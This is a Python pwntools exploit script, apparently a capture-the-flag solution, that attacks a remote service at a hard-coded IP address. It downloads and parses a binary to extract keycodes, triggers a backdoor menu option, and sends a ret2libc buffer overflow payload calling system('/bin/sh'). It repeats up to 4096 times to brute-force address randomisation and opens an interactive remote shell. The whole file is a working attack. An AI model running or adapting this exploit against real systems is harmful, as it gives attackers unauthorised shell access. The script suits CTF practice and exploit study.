from pwn import *
import re

local = False

for i in range(4096):
    if i % 200 == 0:
        print "********************************************\n i = {}\n********************************************".format(i)

    # remove previous extracted ELF file
    os.system('rm -f gift')

    # connect to remote service, and select option 1
    p = remote('18.205.93.120', 1205)
    r = p.recvuntil('>')
    p.send('1')

    # get the response, and obtain the base64 text with a regex (which is all text between round brackets)
    gift = p.recvuntil(')')
    result = re.search(r'\(\n(.*)\n\)', gift, re.DOTALL)
    gift_base64 = result.group(1)

    # decode base64 text and write it to a file
    gift_gz = b64d(gift_base64)
    with open('gift.gz', 'w') as f:
        f.write(gift_gz)

    # unzip gz file
    os.system('gunzip gift.gz')

    # load ELF file
    gift_binary = ELF('./gift')
    keycodes = [
        unpack(gift_binary.read(0x80487C0, 4)),  # read 4 bytes at address 0x80487C0 and unpack them to get a hex number
        unpack(gift_binary.read(0x80487D1, 4)),
        unpack(gift_binary.read(0x80487E2, 4)),
        unpack(gift_binary.read(0x80487F0, 4)),
        unpack(gift_binary.read(0x8048801, 4)),
        unpack(gift_binary.read(0x8048812, 4)),
        unpack(gift_binary.read(0x8048823, 4)),
        unpack(gift_binary.read(0x8048831, 4)),
        unpack(gift_binary.read(0x8048842, 4)),
        unpack(gift_binary.read(0x804884F, 4)),
        unpack(gift_binary.read(0x804885C, 4)),
        unpack(gift_binary.read(0x8048866, 4)),
        unpack(gift_binary.read(0x8048873, 4)),
        unpack(gift_binary.read(0x8048880, 4)),
        unpack(gift_binary.read(0x804888D, 4)),
        unpack(gift_binary.read(0x8048897, 4)),
    ]

    # activate pwnshop_backdoor
    p.send('666')

    # send keycodes
    for i in range(len(keycodes)):
        r = p.recvuntil('Enter keycode {}:'.format(i))
        p.send(str(keycodes[i]))

    # get response and send malicious payload
    r = p.recvuntil('Enter new keycode:')
    offset = 16
    system_address = 0xf7d42d10
    binsh_address = 0xf7e818cf
    p.send('A'*offset + pack(system_address) + 'BBBB' + pack(binsh_address))

    try:
        # if no error is raised, we have a working shell
        sleep(1)
        p.recvline()
        p.interactive()
    except EOFError:
        print "Not there yet... Closing connection."

    p.close()
